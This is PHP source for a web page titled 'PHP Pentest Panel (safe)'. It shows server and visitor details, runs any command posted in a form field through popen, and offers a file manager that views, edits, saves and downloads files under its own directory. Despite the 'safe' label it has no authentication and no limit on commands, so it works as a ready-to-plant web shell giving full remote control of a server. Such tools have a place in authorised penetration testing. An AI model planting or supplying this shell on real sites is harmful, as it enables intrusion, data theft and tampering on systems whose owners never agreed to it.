<?php
/*****************************
 * PHP Pentest Panel (safe)
 * - General Info
 * - Command Executor (popen)
 * - File Manager (browse/view/edit/download)
 *****************************/

// ====== CONFIG ======
const BASE_PATH = __DIR__;
const MAX_EDIT_BYTES = 512 * 1024; // max file size for editing (512 KB)
$allowed_mime_prefixes = ['text/', 'application/json', 'application/xml'];

// ====== HELPERS ======
function normalizePath(string $path): string {
    $real = realpath($path);
    if ($real === false) return '';
    $base = realpath(BASE_PATH);
    if ($base === false) die('Base path invalid.');
    if (strncmp($real, $base, strlen($base)) !== 0) return '';
    return $real;
}
function joinPath(string $a, string $b): string {
    return rtrim($a, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($b, DIRECTORY_SEPARATOR);
}
function humanSize(int $bytes): string {
    $u = ['B','KB','MB','GB','TB']; $i = 0;
    while ($bytes >= 1024 && $i < count($u)-1) { $bytes /= 1024; $i++; }
    return ($i ? number_format($bytes, 2) : $bytes) . ' ' . $u[$i];
}
function permString($path): string {
    $p = fileperms($path);
    $t = ($p & 0x4000) ? 'd' : '-'; // directory or file
    $rwx = '';
    $m = [0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
    foreach ($m as $i=>$bit) $rwx .= ($p & $bit) ? 'rwxrwxrwx'[$i] : '-';
    return $t.$rwx;
}
function ownerGroup($path): string {
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $uid = @fileowner($path); $gid = @filegroup($path);
        $u = $uid !== false ? @posix_getpwuid($uid)['name'] ?? $uid : '?';
        $g = $gid !== false ? @posix_getgrgid($gid)['name'] ?? $gid : '?';
        return "$u:$g";
    }
    return 'N/A';
}
function isTextLike($path, $allowed): bool {
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = $finfo ? finfo_file($finfo, $path) : '';
    if ($finfo) finfo_close($finfo);
    foreach ($allowed as $prefix) {
        if (str_starts_with((string)$mime, $prefix)) return true;
    }
    return false;
}

// ====== GENERAL INFO ======
$general_info = [
    "OS" => php_uname(),
    "PHP Version" => phpversion(),
    "User" => get_current_user() . " || UID: " . getmyuid() . " || GID: " . getmygid(),
    "Server Software" => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    "Request Method" => $_SERVER['REQUEST_METHOD'] ?? 'N/A',
    "Server IP" => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
    "Your IP" => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    "X-Forwarded-For IP" => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'N/A'
];

// ====== EXECUTOR ======
$output = "";
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $handle = popen($cmd, "r");
    if ($handle) {
        while (!feof($handle)) {
            $output .= fgets($handle);
        }
        pclose($handle);
    }
}

// ====== FILE MANAGER ======
$rel = trim($_GET['p'] ?? '', '/');
$current = normalizePath(joinPath(BASE_PATH, $rel));
$tab = $_GET['tab'] ?? "info";

// Save edited file
if ($tab=="files" && isset($_POST['savefile']) && $current && is_file($current)) {
    file_put_contents($current, $_POST['savefile']);
    $msg = "File saved successfully.";
}

// Download
if ($tab=="files" && isset($_GET['dl']) && is_file($current)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($current).'"');
    header('Content-Length: '.filesize($current));
    readfile($current);
    exit;
}

// View (inline or edit)
$viewFile = false;
$editFile = false;
if ($tab=="files" && $current && is_file($current)) {
    if (isset($_GET['view'])) {
        $viewFile = true;
    }
    if (isset($_GET['edit']) && filesize($current) <= MAX_EDIT_BYTES && isTextLike($current,$allowed_mime_prefixes)) {
        $editFile = true;
    }
}

// List directory
$items = [];
if ($tab=="files" && $current && is_dir($current)) {
    $dh = opendir($current);
    if ($dh) {
        while (($f = readdir($dh)) !== false) {
            if ($f === '.') continue;
            if ($f === '..' && realpath($current) === realpath(BASE_PATH)) continue;
            $full = joinPath($current, $f);
            $items[] = [
                'name'=>$f,
                'isDir'=>is_dir($full),
                'size'=>is_dir($full)?0:filesize($full),
                'mtime'=>filemtime($full),
                'perm'=>permString($full),
                'own'=>ownerGroup($full),
                'rel'=>ltrim(($rel? $rel.'/':'').$f,'/')
            ];
        }
        closedir($dh);
    }
    usort($items, fn($a,$b)=>$a['isDir']===$b['isDir']? strnatcasecmp($a['name'],$b['name']):($a['isDir']?-1:1));
}
?>
<!DOCTYPE html>
<html>
<head>
<title>PHP Pentest Panel</title>
<style>
body { font-family: Arial, sans-serif; background: #121212; color: #eee; margin: 0; }
.navbar { background: #1e1e1e; padding: 10px; display: flex; }
.navbar a { color: #eee; text-decoration: none; margin-right: 15px; padding: 6px 10px; border-radius: 6px; }
.navbar a:hover, .navbar a.active { background: #333; }
.container { padding: 20px; }
.card { background: #1e1e1e; border: 1px solid #444; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
pre { background: #222; padding: 10px; border-radius: 6px; overflow-x: auto; }
input[type=text], textarea { width: 100%; padding: 8px; background: #222; color: #eee; border: 1px solid #555; border-radius:6px; }
input[type=submit], button { padding: 8px 16px; background: #444; color: #eee; border: 1px solid #555; cursor: pointer; border-radius: 6px; }
table { width:100%; border-collapse:collapse; }
th, td { padding:8px; border-bottom:1px solid #333; text-align:left; }
</style>
</head>
<body>
<div class="navbar">
  <a href="?tab=info" class="<?= $tab=='info'?'active':'' ?>">General Information</a>
  <a href="?tab=exec" class="<?= $tab=='exec'?'active':'' ?>">Command Executor</a>
  <a href="?tab=files" class="<?= $tab=='files'?'active':'' ?>">File Manager</a>
</div>
<div class="container">
<?php if ($tab=="info"): ?>
  <div class="card"><h2>General Information</h2><ul>
  <?php foreach ($general_info as $k=>$v): ?>
    <li><strong><?=htmlspecialchars($k)?></strong>: <?=htmlspecialchars($v)?></li>
  <?php endforeach; ?>
  </ul></div>

<?php elseif ($tab=="exec"): ?>
  <div class="card">
    <h2>Command Executor</h2>
    <form method="post">
      <input type="text" name="cmd" placeholder="Enter command" autofocus>
      <input type="submit" value="Run">
    </form>
    <?php if (!empty($output)): ?>
      <h3>Output:</h3>
      <pre><?=htmlspecialchars($output)?></pre>
    <?php endif; ?>
  </div>

<?php elseif ($tab=="files"): ?>
  <div class="card">
    <h2>File Manager</h2>
    <?php if (!empty($msg)): ?><p style="color:lightgreen"><?=$msg?></p><?php endif; ?>

    <?php if ($editFile): ?>
      <h3>Editing: <?=htmlspecialchars(basename($current))?></h3>
      <form method="post">
        <textarea name="savefile" rows="20"><?=htmlspecialchars(file_get_contents($current))?></textarea><br>
        <button type="submit">Save</button>
      </form>
    <?php elseif ($viewFile): ?>
      <h3>Viewing: <?=htmlspecialchars(basename($current))?></h3>
      <pre><?=htmlspecialchars(file_get_contents($current))?></pre>
    <?php elseif ($current && is_dir($current)): ?>
      <table>
        <tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Owner</th><th>Actions</th></tr>
        <?php if ($rel && $current!=realpath(BASE_PATH)): ?>
          <tr><td><a href="?tab=files&p=<?=urlencode(dirname($rel))?>">.. (parent)</a></td><td>—</td><td>—</td><td>—</td><td>—</td><td>—</td></tr>
        <?php endif; ?>
        <?php foreach ($items as $it): ?>
          <tr>
            <td><?=$it['isDir']?'📁':'📄'?> <a href="?tab=files&p=<?=urlencode($it['rel'])?>"><?=htmlspecialchars($it['name'])?></a></td>
            <td><?=$it['isDir']?'—':humanSize($it['size'])?></td>
            <td><?=date('Y-m-d H:i:s',$it['mtime'])?></td>
            <td><?=$it['perm']?></td>
            <td><?=$it['own']?></td>
            <td>
              <?php if (!$it['isDir']): ?>
                <a href="?tab=files&p=<?=urlencode($it['rel'])?>&view=1">View</a> |
                <a href="?tab=files&p=<?=urlencode($it['rel'])?>&edit=1">Edit</a> |
                <a href="?tab=files&p=<?=urlencode($it['rel'])?>&dl=1">Download</a>
              <?php endif; ?>
            </td>
          </tr>
        <?php endforeach; ?>
      </table>
    <?php endif; ?>
  </div>
<?php endif; ?>
</div>
</body>
</html>
